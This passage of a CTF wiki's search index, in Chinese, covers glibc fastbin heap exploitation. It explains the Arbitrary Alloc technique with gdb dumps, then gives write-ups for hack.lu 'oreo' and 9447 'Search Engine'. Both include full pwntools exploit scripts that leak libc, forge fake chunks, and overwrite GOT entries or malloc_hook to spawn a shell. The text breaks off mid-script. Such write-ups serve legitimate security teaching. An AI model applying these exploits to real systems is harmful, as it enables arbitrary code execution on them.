0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]","title":"\u6f14\u793a"},{"location":"Pwn/glibc-heap/fastbin/#_11","text":"\u901a\u8fc7\u8be5\u6280\u672f\u6211\u4eec\u53ef\u4ee5\u628a fastbin chunk \u5206\u914d\u5230\u6808\u4e2d\uff0c\u4ece\u800c\u63a7\u5236\u8fd4\u56de\u5730\u5740\u7b49\u5173\u952e\u6570\u636e\u3002\u8981\u5b9e\u73b0\u8fd9\u4e00\u70b9\u6211\u4eec\u9700\u8981\u52ab\u6301 fastbin \u4e2d chunk \u7684 fd \u57df\uff0c\u628a\u5b83\u6307\u5230\u6808\u4e0a\uff0c\u5f53\u7136\u540c\u65f6\u9700\u8981\u6808\u4e0a\u5b58\u5728\u6709\u6ee1\u8db3\u6761\u4ef6\u7684 size \u503c\u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"Pwn/glibc-heap/fastbin/#arbitrary-alloc","text":"","title":"Arbitrary Alloc"},{"location":"Pwn/glibc-heap/fastbin/#_12","text":"Arbitrary Alloc \u5176\u5b9e\u4e0e Alloc to stack \u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5206\u914d\u7684\u76ee\u6807\u4e0d\u518d\u662f\u6808\u4e2d\u3002 \u4e8b\u5b9e\u4e0a\u53ea\u8981\u6ee1\u8db3\u76ee\u6807\u5730\u5740\u5b58\u5728\u5408\u6cd5\u7684 size \u57df\uff08\u8fd9\u4e2a size \u57df\u662f\u6784\u9020\u7684\uff0c\u8fd8\u662f\u81ea\u7136\u5b58\u5728\u7684\u90fd\u65e0\u59a8\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a chunk \u5206\u914d\u5230\u4efb\u610f\u7684\u53ef\u5199\u5185\u5b58\u4e2d\uff0c\u6bd4\u5982 bss\u3001heap\u3001data\u3001stack \u7b49\u7b49\u3002","title":"\u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/fastbin/#_13","text":"\u5728\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4f7f\u7528\u5b57\u8282\u9519\u4f4d\u6765\u5b9e\u73b0\u76f4\u63a5\u5206\u914d fastbin \u5230**_malloc_hook \u7684\u4f4d\u7f6e\uff0c\u76f8\u5f53\u4e8e\u8986\u76d6_malloc_hook \u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002** int main(void) { void *chunk1; void *chunk_a; chunk1=malloc(0x60); free(chunk1); *(long long *)chunk1=0x7ffff7dd1af5-0x8; malloc(0x60); chunk_a=malloc(0x60); return 0; } \u8fd9\u91cc\u7684 0x7ffff7dd1af5 \u662f\u6211\u6839\u636e\u672c\u673a\u7684\u60c5\u51b5\u5f97\u51fa\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662f\u600e\u4e48\u83b7\u5f97\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u89c2\u5bdf\u6b32\u5199\u5165\u5730\u5740\u9644\u8fd1\u662f\u5426\u5b58\u5728\u53ef\u4ee5\u5b57\u8282\u9519\u4f4d\u7684\u60c5\u51b5\u3002 0x7ffff7dd1a88 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1a90 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1a98 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1aa0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1aa8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ab0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ab8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ac0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ac8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ad0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ad8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ae0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ae8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b08 0x0 0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 <__malloc_hook>: 0x30 0x28 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 \u662f\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684 __malloc_hook \u7684\u5730\u5740\uff0c\u4e8e\u662f\u6211\u4eec\u5411\u4e0a\u5bfb\u627e\u662f\u5426\u53ef\u4ee5\u9519\u4f4d\u51fa\u4e00\u4e2a\u5408\u6cd5\u7684 size \u57df\u3002\u56e0\u4e3a\u8fd9\u4e2a\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u56e0\u6b64 fastbin \u7684\u8303\u56f4\u4e3a 32 \u5b57\u8282\u5230 128 \u5b57\u8282 (0x20-0x80)\uff0c\u5982\u4e0b\uff1a //\u8fd9\u91cc\u7684size\u6307\u7528\u6237\u533a\u57df\uff0c\u56e0\u6b64\u8981\u5c0f2\u500dSIZE_SZ Fastbins[idx=0, size=0x10] Fastbins[idx=1, size=0x20] Fastbins[idx=2, size=0x30] Fastbins[idx=3, size=0x40] Fastbins[idx=4, size=0x50] Fastbins[idx=5, size=0x60] Fastbins[idx=6, size=0x70] \u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0 0x7ffff7dd1af5 \u5904\u53ef\u4ee5\u73b0\u5b9e\u9519\u4f4d\u6784\u9020\u51fa\u4e00\u4e2a 0x000000000000007f 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1af5 <_IO_wide_data_0+309>: 0x000000000000007f \u56e0\u4e3a 0x7f \u5728\u8ba1\u7b97 fastbin index \u65f6\uff0c\u662f\u5c5e\u4e8e index 5 \u7684\uff0c\u5373 chunk \u5927\u5c0f\u4e3a 0x70 \u7684\u3002 ##define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \uff08\u6ce8\u610f sz \u7684\u5927\u5c0f\u662f unsigned int\uff0c\u56e0\u6b64\u53ea\u5360 4 \u4e2a\u5b57\u8282\uff09 \u800c\u5176\u5927\u5c0f\u53c8\u5305\u542b\u4e86 0x10 \u7684 chunk_header\uff0c\u56e0\u6b64\u6211\u4eec\u9009\u62e9\u5206\u914d 0x60 \u7684 fastbin\uff0c\u5c06\u5176\u52a0\u5165\u94fe\u8868\u3002 \u6700\u540e\u7ecf\u8fc7\u4e24\u6b21\u5206\u914d\u53ef\u4ee5\u89c2\u5bdf\u5230 chunk \u88ab\u5206\u914d\u5230 0x7ffff7dd1afd\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 __malloc_hook \u7684\u5185\u5bb9 (\u5728\u6211\u7684 libc \u4e2d__realloc_hook \u4e0e__malloc_hook \u662f\u5728\u8fde\u5728\u4e00\u8d77\u7684)\u3002 0x4005a8 <main+66> call 0x400450 <malloc@plt> \u2192 0x4005ad <main+71> mov QWORD PTR [rbp-0x8], rax $rax : 0x7ffff7dd1afd 0x7ffff7dd1aed <_IO_wide_data_0+301>: 0xfff7dd0260000000 0x000000000000007f 0x7ffff7dd1afd: 0xfff7a92e20000000 0xfff7a92a0000007f 0x7ffff7dd1b0d <__realloc_hook+5>: 0x000000000000007f 0x0000000000000000 0x7ffff7dd1b1d: 0x0000000000000000 0x0000000000000000","title":"\u6f14\u793a"},{"location":"Pwn/glibc-heap/fastbin/#_14","text":"Arbitrary Alloc \u5728 CTF \u4e2d\u7528\u5730\u66f4\u52a0\u9891\u7e41\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b57\u8282\u9519\u4f4d\u7b49\u65b9\u6cd5\u6765\u7ed5\u8fc7 size \u57df\u7684\u68c0\u9a8c\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d chunk\uff0c\u6700\u540e\u7684\u6548\u679c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"Pwn/glibc-heap/fastbin/#2014-hacklu-oreo","text":"","title":"2014 hack.lu oreo"},{"location":"Pwn/glibc-heap/fastbin/#_15","text":"\u7a0b\u5e8f\u6bd4\u8f83\u53e4\u8001\uff0c32 \u4f4d\u7684\u5806\u9898 1 2 3 4 5 Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/glibc-heap/fastbin/#_16","text":"\u5b58\u50a8\u67aa\u652f\u4fe1\u606f\u7ed3\u6784\u4f53\uff1a struct rifle { description //\u4ece0\u5b57\u8282\u5f00\u59cb name //\u4ece25\u5b57\u8282\u5f00\u59cb pre_rifle_ptr //\u4ece52\u5b57\u8282\u5f00\u59cb } //\u603b\u517156\u5b57\u8282 \u6dfb\u52a0\u67aa\u652f\uff0c\u4f1a\u8bfb\u53d6\u67aa\u652f\u7684\u540d\u5b57\u4e0e\u63cf\u8ff0\u3002\u8bfb\u53d6\u7684\u540d\u5b57\u7684\u957f\u5ea6\u4e3a 56 \uff0c\u53ef\u4ee5\u8986\u76d6\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u67aa\u652f\u4fe1\u606f\u5806\u5757\u5927\u5c0f\u56fa\u5b9a\u4e3a 0x40 \uff08\u542bchunk_header\uff09\u3002 \u5c55\u793a\u6dfb\u52a0\u67aa\u652f\uff0c\u5373\u4ece\u5934\u5230\u5c3e\u8f93\u51fa\u67aa\u652f\u7684\u63cf\u8ff0\u4e0e\u540d\u5b57\u3002 ~~\u8ba2\u5df2\u7ecf\u9009\u62e9\u7684\u67aa\u652f\uff0c\u5373\u5c06\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\u6389\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u7f6e\u4e3a NULL\u3002~~\u5c06\u6700\u540e\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\uff0c\u7136\u540e\u5728\u91ca\u653e\u5f53\u524d\u5806\u6700\u540e 4 \u5b57\u8282\u6307\u5411\u7684\u5185\u5b58\u5730\u5740\uff0c\u5982\u679c\u4e3a 0 \u5219\u7ed3\u675f\u91ca\u653e\u3002 pwndbg> x /20wx 0x0804b858-0x8 0x804b850: 0x00000000 0x00000041 0x64646464 0x64646464 0x804b860: 0x00000000 0x00000000 0x00000000 0x00000000 0x804b870: 0x63636300 0x63636363 0x00000063 0x00000000 0x804b880: 0x00000000 0x00000000 0x00000000 0x0804b818<--\u6307\u5411\u4e0b\u4e00\u4e2a\u5806 0x804b890: 0x00000000 0x00020771 0x00000000 0x00000000 \u7559\u4e0b\u8ba2\u8d27\u6d88\u606f \u5c55\u793a\u76ee\u524d\u72b6\u6001\uff0c\u5373\u6dfb\u52a0\u4e86\u591a\u5c11\u53ea\u67aa\uff0c\u8ba2\u4e86\u591a\u5c11\u5355\uff0c\u7559\u4e0b\u4e86\u4ec0\u4e48\u4fe1\u606f\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/fastbin/#_17","text":"create \u7684\u65f6\u5019 name \u548c description \u90fd\u5b58\u5728\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u4e24\u8005\u53ef\u8f93\u5165\u957f\u5ea6\u90fd\u662f 56 \u5b57\u8282\u3002\u4fee\u6539\u4e24\u8005\u90fd\u662f\u53ef\u4ee5\u4fee\u6539 chunk \u6307\u5411\u7684\u4e0b\u4e00\u4e2a chunk \u5730\u5740\uff0c\u4e5f\u5c31\u662f\u6700\u540e 4 \u5b57\u8282\uff0c\u4fee\u6539 desc \u65f6\u8fd8\u53ef\u4ee5\u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/fastbin/#_18","text":"\u6ca1\u6709\u6253\u5f00 PIE \uff0c\u4e00\u5f00\u59cb\u60f3\u7740 double free \u7136\u540e\u6539 got \u8868\u5730\u5740\u6cc4\u9732 getshell \u4e00\u6761\u9f99\u3002\u4f46\u662f\u6709\u4e2a\u5927\u95ee\u9898\uff0cchunk_ptr \u53ea\u4fdd\u5b58\u6700\u540e\u7533\u8bf7 chunk \u7684\u6307\u9488\u4fe1\u606f\uff0c\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684 chunk \uff0c\u65e7\u6307\u9488\u5c31\u4f1a\u88ab\u8986\u76d6\u4e86\uff0c\u6307\u9488\u4e22\u5931\u4e86\uff0c\u65e0\u6cd5\u5b8c\u6210 double free \u3002 \u6700\u7ec8\u4f7f\u7528 house of spirit getshell \u3002 \u7533\u8bf7\u4e00\u4e2a chunk \uff0c\u901a\u8fc7\u6ea2\u51fa\u5c06\u67d0\u4e2a\u51fd\u6570 got \u8868\u5730\u5740\u5199\u5165\u6700\u540e 4 \u4e2a\u5b57\u8282\uff0c\u7528\u8f93\u51fa\u529f\u80fd\u6cc4\u9732 libc \u5730\u5740\u3002 \u7533\u8bf7 0x40 \u4e2a chunk \uff0c\u7528\u4e8e\u540e\u7eed\u4f2a\u9020 fastbin \u7ed5\u8fc7 size check \u68c0\u67e5\u3002 \u6ea2\u51fa\u4fee\u6539 chunk \u6700\u540e 4 \u5b57\u8282\u7684\u4e0b\u4e00\u4e2a chunk \u6307\u9488\uff0c\u6307\u5411 0x0804A2A8 notice_ptr \uff0c\u8fd9\u4e2a\u662f\u4f5c\u4e3a fake chunk \u7684 fd \u4f4d\u3002 \u5e03\u7f6e 0x0804A2A8 \u540e\u9762\u7684 chunk \u4fe1\u606f\u7ed5\u8fc7\u68c0\u67e5\uff0c\u524d\u9762\u7684\u7ed5\u8fc7\u4f2a\u9020\u5df2\u7ecf\u5728\u7b2c\u4e00\u6b65\u5b8c\u6210\u3002 \u63d0\u4ea4\u4fe1\u606f\uff08free all chunk\uff09\uff0cfastbin \u5c31\u4f1a\u5f97\u5230\u8fd9\u6837\u7684\u4e00\u7ec4\u6307\u9488\uff1a 0x40: 0x0804A2A0->some where heap->NULL \u5230\u8fd9\u91cc\u5c31\u5f97\u5230\u4e00\u7ec4\u4efb\u610f\u5199\u6307\u9488\u4e86\u3002 \u7533\u8bf7 0x40 \u4e2a chunk \u4f1a\u8bb0\u5f55\u5728 chunk_num \uff0c\u5982\u679c\u4ee5 0x0804A2A8 \u4e3a fake chunk \u7684 fd \u6307\u9488\uff0c\u90a3\u4e48 chunk_num \u521a\u521a\u597d\u5c31\u662f fake_chunk size \u4f4d\uff1a pwndbg> x /20wx 0x0804A2A0 0x804a2a0: 0x00000000 0x00000040 0x0804a2c0 0x00000000 0x804a2b0: 0x00000000 0x00000000 0x00000000 0x00000000 \u7533\u8bf7\u7b2c 0x40 \u7684\u65f6\u5019\u6ea2\u51fa\u4fee\u6539\u6700\u540e 4 \u5b57\u8282\u7684\u4e0b\u4e00 chunk \u5730\u5740\u4e3a 0x0804A2A8 \u3002bypass fastbin size check \u3002 \u7136\u540e\u5229\u7528\u5199\u5165 notice \u4fe1\u606f\uff0c\u5e03\u7f6e fake_chunk \u540e\u4e00\u4e2a chunk \u4fe1\u606f\uff0cbypass \u76f8\u5173\u4fdd\u62a4\uff0c\u5b8c\u6210 house of spirit \u5e03\u7f6e\u3002 \u5199\u5165\u5185\u5bb9\u5c31\u662f\u5c31\u662f\uff1a\u4ece 0x0804A2A8 + 0x30 \u5f00\u59cb\u5199\u5165\u4e0b\u4e00\u4e2a chunk header \u4fe1\u606f\u5373\u53ef\uff08prev_size = 0x40 , size = 0x100 \uff09\u3002 \u5f53 free all chunk \u65f6 fake chunk \u5c31\u4f1a\u901a\u8fc7\u68c0\u67e5\uff0c\u6210\u529f\u653e\u5165\u5230 bin \u4e2d\uff1a 0x40: 0x0804A2A0->some where heap->NULL \u518d\u6b21\u7533\u8bf7 chunk \uff0c\u5e76\u5199\u5165\u51fd\u6570\u5730\u5740\uff0c\u4e4b\u540e\u901a\u8fc7\u5199\u5165 notice \u4fee\u6539\u51fd\u6570\u3002","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/fastbin/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'i386' ) context . binary = \"./oreo\" oreo = ELF ( \"./oreo\" ) p = process ( \"./oreo\" ) libc = ELF ( './libc.so.6' ) def add ( descrip , name ): p . sendline ( '1' ) #p.recvuntil('Rifle name: ') p . sendline ( name ) #p.recvuntil('Rifle description: ') #sleep(0.5) p . sendline ( descrip ) def show_rifle (): p . sendline ( '2' ) p . recvuntil ( '=================================== \\n ' ) def order (): p . sendline ( '3' ) def message ( notice ): p . sendline ( '4' ) #p.recvuntil(\"Enter any notice you'd like to submit with your order: \") p . sendline ( notice ) def exp (): print 'step 1. leak libc base' name = 27 * 'a' + p32 ( oreo . got [ 'puts' ]) add ( 25 * 'a' , name ) show_rifle () p . recvuntil ( '=================================== \\n ' ) p . recvuntil ( 'Description: ' ) puts_addr = u32 ( p . recvuntil ( ' \\n ' , drop = True )[: 4 ]) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] system_addr = libc_base + libc . symbols [ 'system' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) print 'step 2. free fake chunk at 0x0804A2A8' # now, oifle_cnt=1, we need set it = 0x40 oifle = 1 while oifle < 0x3f : # set next link=NULL add ( 25 * 'a' , 'a' * 27 + p32 ( 0 )) oifle += 1 payload = 'a' * 27 + p32 ( 0x0804a2a8 ) # set next link=0x0804A2A8, try to free a fake chunk add ( 25 * 'b' , payload ) # gdb.attach(p) # before free, we need to bypass some check # fake chunk's size is 0x40 # 0x20 *'a' for padding the last fake chunk # 0x40 for fake chunk's next chunk's prev_size # 0x100 for fake chunk's next chunk's size # set fake iofle' next to be NULL payload = 0x20 * ' \\x00 ' + p32 ( 0x40 ) + p32 ( 0x100 ) # payload = payload.ljust(60, 'b') # payload += p32(0) # payload = payload.ljust(128, 'c') message ( payload ) # fastbin 0x40: 0x0804A2A0->some where heap->NULL order () p . recvuntil ( 'Okay order submitted! \\n ' ) print 'step 3. get shell' # modify free@got to system addr payload = p32 ( oreo . got [ 'strlen' ]) . ljust ( 20 , 'a' ) add ( payload , 'b' * 20 ) log . success ( 'system addr: ' + hex ( system_addr )) #gdb.attach(p) message ( p32 ( system_addr ) + '||/bin/sh \\x00 ' ) p . interactive () if __name__ == \"__main__\" : exp () [\u539f\u521b]2014 hack.lu oreo","title":"EXP"},{"location":"Pwn/glibc-heap/fastbin/#2015-9447-ctf-search-engine","text":"","title":"2015 9447 CTF : Search Engine"},{"location":"Pwn/glibc-heap/fastbin/#_19","text":"1 2 3 4 5 6 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled \u7a0b\u5e8f\u6ca1\u6709 setbuf \uff0c\u4f1a\u81ea\u52a8\u7533\u8bf7 chunk \u5b58\u653e\u8f93\u5165\u7f13\u51b2\u6570\u636e\u3002","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/glibc-heap/fastbin/#_20","text":"\u4e00\u4e2a\u53d8\u79cd\u7684\u5806\u7ba1\u7406\u5668\uff0c\u7b97\u662f\u6709\u589e\u5220\u67e5\u529f\u80fd\u3002\u83dc\u5355\u4e24\u4e2a\u5165\u53e3\uff1a Search with a word Index a sentence index \u53ef\u4ee5\u521b\u5efa\u5806\uff0c\u5927\u5c0f\u81ea\u5b9a\u4e49\uff08\u5c0f\u4e8e 0xFFD\uff09\uff0c\u8bfb\u53d6\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u7b49\u4e8e\u7ed9\u5b9a\u7684\u957f\u5ea6\uff0c\u8f93\u5165\u5b57\u7b26\u4e32\u6ca1\u6709\u8bbe\u7f6e\u7ed3\u675f\u7b26 \\x00 \u3002 search \u641c\u7d22\u53e5\u5b50\uff0c\u8bfb\u53d6\u641c\u7d22\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u7b49\u7ed9\u5b9a\u957f\u5ea6\uff0c\u68c0\u7d22\u89c4\u5219\u5982\u4e0b\uff1a for ( i = chunk_list ; i ; i = * ( _QWORD * )( i + 0x20 ) ) { if ( ** ( _BYTE ** )( i + 16 ) ) { if ( * ( _DWORD * )( i + 8 ) == v0 && ! memcmp ( * ( const void ** ) i , chunk_ptr , v0 ) ) { \u5177\u4f53\u7ed3\u6784\u4f53\u7ed3\u6784\u8c03\u8bd5\u4e00\u4e0b\u5c31\u80fd\u770b\u5230\u903b\u8f91\uff0c0x28 \u90a3\u4e2a\u5c31\u662f\u7ed3\u6784\u4f53 chunk \u3002 \u9996\u5148\u662f sentence chunk \u9996\u5b57\u8282\u4e0d\u80fd\u4e3a \\x00 \uff0c\u7136\u540e\u6839\u636e size \u548c memcmp \u641c\u7d22\u76f8\u540c\u7684 chunk \u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/fastbin/#_21","text":"\u6700\u660e\u663e\u7684\u5c31\u662f double free \uff0c\u5728 search \u627e\u5230\u5bf9\u5e94 sentenc chunk \u4e4b\u540e\uff0c\u9009\u62e9\u91ca\u653e\u5b8c\u6210\u540e\uff0c\u5e76\u6ca1\u6709\u5c06\u7ed3\u6784\u4f53\u6307\u9488\u7f6e\u96f6\u3002 \u8fd9\u4e2a\u529f\u80fd\u51fd\u6570\u8fd8\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u91ca\u653e sentenc chunk \u4e4b\u524d\u4f1a\u4f7f\u7528 memset \u5c06 chunk \u5168\u90e8\u7f6e\u96f6\uff0c\u907f\u514d\u4e86\u68c0\u67e5\u88ab\u91ca\u653e\u7684 chunk \uff08\u6e90\u7801\u68c0\u67e5\u673a\u5236\uff1a if ( **(_BYTE **)(i + 16) ) \uff09\uff0c\u4f46\u662f\u5f53 chunk \u653e\u5165 fastbin \u975e\u9996\u4e2a chunk \u6216\u8005\u662f unsortedbin \u7b49\u65f6\uff0c\u4f1a\u5411 fd \u3001bk \u5199\u5165\u5730\u5740\u4fe1\u606f\uff0c\u4f7f\u5f97 sentenc chunk \u9996\u5b57\u8282\u975e 0 \uff0c\u81f4\u4f7f search \u65f6\u6700\u7ec8\u8fd8\u662f\u4f1a\u641c\u7d22\u88ab\u91ca\u653e\u7684 chunk \u3002 \u8fd8\u6709\u6f0f\u6d1e\u5c31\u662f\u5199\u5165 sentenc \u7684\u65f6\u5019\uff0c\u5982\u679c\u5199\u5165\u957f\u5ea6\u521a\u521a\u597d\u7b49\u4e8e\u7ed9\u51fa\u7684\u5199\u5165\u957f\u5ea6\uff0c\u90a3\u4e48 sentenc \u7ed3\u5c3e\u4e0d\u4f1a\u8865\u4e0a\u7ed3\u675f\u7b26 \\x00 \u3002\uff08\u7f51\u4e0a\u6709 wp \u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u6cc4\u9732\u6808\u4e0a\u7684 libc \u5730\u5740\uff09","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/fastbin/#_22","text":"\u5229\u7528 free \u4e4b\u540e\u6ca1\u6709\u7f6e\u96f6\u6307\u9488\uff0c\u5b8c\u6210\u6cc4\u9732 libc \u5730\u5740\uff0cfastbin Arbitrary Alloc \u4fee\u6539 malloc_hook \u4e3a onegadget \u3002 \u7533\u8bf7\u4e00\u4e2a\u975e fastbin \u5927\u5c0f chunk \uff0c\u5c06\u5176\u91ca\u653e\uff0cfd \u6307\u9488\u5c31\u4f1a\u5199\u5165 libc \u6bb5\u5730\u5740\u3002\u5229\u7528 search \u641c\u7d22 \\x00 \uff0c\u627e\u5230\u5728 unsorted bin \u4e2d\u7684 chunk \uff0c\u7a0b\u5e8f\u4f1a\u5c06 chunk \u7684 fd \u6307\u9488\u7ed9\u8f93\u51fa\u3002 \u7533\u8bf7 3 \u4e2a fastbin chunk \uff0c\u5229\u7528\u6700\u540e\u4e24\u4e2a\u5b8c\u6210 Arbitrary Alloc \u7be1\u6539 malloc_hook \u7533\u8bf7 0x88 unsorted bin chunk \uff0c\u6cc4\u9732 libc \u5730\u5740\uff1a Index ( ' m ' . rjust ( 0x88 , 'a' )) search ( 'm' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) search ( ' \\x00 ' ) p . recvuntil ( 'Found 136: ' ) unsortbin_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"unsortbin_addr:\" + hex ( unsortbin_addr )) Arbitrary Alloc \u6b65\u9aa4\uff1asky \u4e09\u4e2a chunk \u5148\u91ca\u653e\u5230 fastbin \u4e2d\uff0c\u7136\u540e double free k chunk \uff0c\u5b8c\u6210\u4fee\u6539\u94fe\u8868\u3002\u5982\u679c\u7f3a\u5c11 s chunk \u53ea\u4f7f\u7528\u4e24\u4e2a\u5806\uff0cdouble free \u65f6\u62a5\u9519\uff1a double free or corruption (fasttop) \uff0c\u6b64\u65f6\u88ab double free chunk \u7684\u94fe\u9996\u3002 search ( 's' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( 'k' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( 'y' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( ' \\x00 ' ) p . recvuntil ( \"Found\" ) p . sendline ( 'n' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) fakechunk_addr = malloc_hook - 0x23 Index ( p64 ( fakechunk_addr ) . ljust ( 0x68 , 'b' )) Index ( ' s ' . rjust ( 0x68 , 'b' )) Index ( ' k ' . rjust ( 0x68 , 'b' )) Index ( p64 ( 0xf1207 + libc_base ) . rjust ( 0x1b , 'a' ) . ljust ( 0x68 , 'b' )) \u7be1\u6539\u94fe\u8868\u4e4b\u540e\uff0c\u901a\u8fc7\u504f\u79fb\u627e\u5230 size \u5728 fastbin \u8303\u56f4\u7684 fakechunk \u3002","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/fastbin/#exp_1","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./search\" ) elf = ELF ( \"./search\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def search ( word ): p . recvuntil ( '3: Quit \\n ' , timeout = 3 ) p . sendline ( '1' ) p . recvuntil ( 'Enter the word size: \\n ' ) p . sendline ( str ( len ( word ))) p . recvuntil ( 'Enter the word: \\n ' ) p . send ( word ) def Index ( word ): p . recvuntil ( '3: Quit \\n ' , timeout = 3 ) p . sendline ( '2' ) p . recvuntil ( 'Enter the sentence size: \\n ' ) p . sendline ( str ( len ( word ))) p . recvuntil ( 'Enter the sentence: \\n ' ) p . send ( word ) def exp (): Index ( ' m ' . rjust ( 0x88 , 'a' )) search ( 'm' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) search ( ' \\x00 ' ) p . recvuntil ( 'Found 136: ' ) unsortbin_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"unsortbin_addr:\" + hex ( unsortbin_addr )) libc_base = unsortbin_addr - 0x3c4b78 system = libc_base + libc . sym [ 